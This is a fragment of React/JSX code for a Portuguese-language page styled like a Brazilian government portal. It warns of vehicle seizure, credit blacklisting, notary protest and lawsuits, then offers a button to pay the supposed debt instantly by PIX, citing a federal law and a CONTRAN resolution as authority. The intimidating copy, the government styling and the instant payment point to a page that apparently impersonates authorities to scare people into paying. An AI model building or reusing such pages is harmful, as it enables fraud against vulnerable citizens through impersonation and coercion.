                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                  </svg>
                </div>
                <div>
                  <p className="text-sm font-medium text-[#333333]">🚨 Busca e Apreensão Imediata do Veículo</p>
                  <p className="text-xs text-[#555555]">
                    Seu veículo será apreendido em blitzes, fiscalizações ou na sua residência. Custos de guincho e
                    pátio serão adicionados.
                  </p>
                </div>
              </li>
              <li className="flex items-start">
                <div className="mr-3 text-[#D4000F] flex-shrink-0 mt-1">
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    className="h-5 w-5"
                    fill="none"
                    viewBox="0 0 24 24"
                    stroke="currentColor"
                  >
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                  </svg>
                </div>
                <div>
                  <p className="text-sm font-medium text-[#333333]">📉 Inclusão Imediata no SERASA e SPC</p>
                  <p className="text-xs text-[#555555]">
                    Seu CPF será negativado em todos os órgãos de proteção ao crédito, impedindo financiamentos e
                    compras.
                  </p>
                </div>
              </li>
              <li className="flex items-start">
                <div className="mr-3 text-[#D4000F] flex-shrink-0 mt-1">
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    className="h-5 w-5"
                    fill="none"
                    viewBox="0 0 24 24"
                    stroke="currentColor"
                  >
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                  </svg>
                </div>
                <div>
                  <p className="text-sm font-medium text-[#333333]">🔒 Bloqueio Total do Veículo</p>
                  <p className="text-xs text-[#555555]">
                    Impossibilidade de licenciar, transferir ou vender o veículo até quitação total dos débitos.
                  </p>
                </div>
              </li>
              <li className="flex items-start">
                <div className="mr-3 text-[#D4000F] flex-shrink-0 mt-1">
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    className="h-5 w-5"
                    fill="none"
                    viewBox="0 0 24 24"
                    stroke="currentColor"
                  >
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                  </svg>
                </div>
                <div>
                  <p className="text-sm font-medium text-[#333333]">⚖️ Protesto em Cartório + Ação Judicial</p>
                  <p className="text-xs text-[#555555]">
                    Débitos protestados e possível ação de execução fiscal com penhora de bens e bloqueio de contas.
                  </p>
                </div>
              </li>
              <li className="flex items-start">
                <div className="mr-3 text-[#D4000F] flex-shrink-0 mt-1">
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    className="h-5 w-5"
                    fill="none"
                    viewBox="0 0 24 24"
                    stroke="currentColor"
                  >
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                  </svg>
                </div>
                <div>
                  <p className="text-sm font-medium text-[#333333]">💰 Acúmulo Exponencial de Custas</p>
                  <p className="text-xs text-[#555555]">
                    Juros, multas, correção monetária, honorários advocatícios e custas processuais aumentarão a dívida
                    mensalmente.
                  </p>
                </div>
              </li>
            </ul>
          </div>

          {/* REMOVED: Promotional discount section, keeping only simple payment button */}
          <div className="mb-6">
            <button
              type="button"
              onClick={handleGerarPix}
              disabled={isGeneratingPix}
              className="w-full bg-[#1351B4] text-white py-5 px-6 rounded-lg hover:bg-[#0D47A1] focus:outline-none focus:ring-4 focus:ring-[#1351B4] focus:ring-offset-2 transition-all duration-300 font-bold text-lg shadow-lg disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center"
            >
              {isGeneratingPix ? (
                <>
                  <div className="inline-block animate-spin rounded-full h-6 w-6 border-b-4 border-white mr-3"></div>
                  Processando pagamento...
                </>
              ) : (
                <>
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    className="h-6 w-6 mr-3"
                    fill="none"
                    viewBox="0 0 24 24"
                    stroke="currentColor"
                  >
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={2}
                      d="M17 9V7a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2m2 4h10a2 2 0 002-2v-6a2 2 0 00-2-2H9a2 2 0 00-2 2v6a2 2 0 002 2zm7-5a2 2 0 11-4 0 2 2 0 014 0z"
                    />
                  </svg>
                  PAGAR {calcularTotalComDesconto()} COM PIX
                </>
              )}
            </button>
          </div>

          <div className="flex justify-center">
            <button
              onClick={handleNovaConsulta}
              className="text-[#1351B4] hover:text-[#0D47A1] font-medium text-sm underline"
            >
              Fazer Nova Consulta
            </button>
          </div>

          <div className="mt-4 text-center">
            <p className="text-xs text-[#555555]">
              Procedimento amparado pela Lei Federal nº 14.999/2023 e Resolução CONTRAN nº 918/2022
            </p>
          </div>
        </motion.div>

        <SecurityBadge />
      </div>
    </div>
  )
}
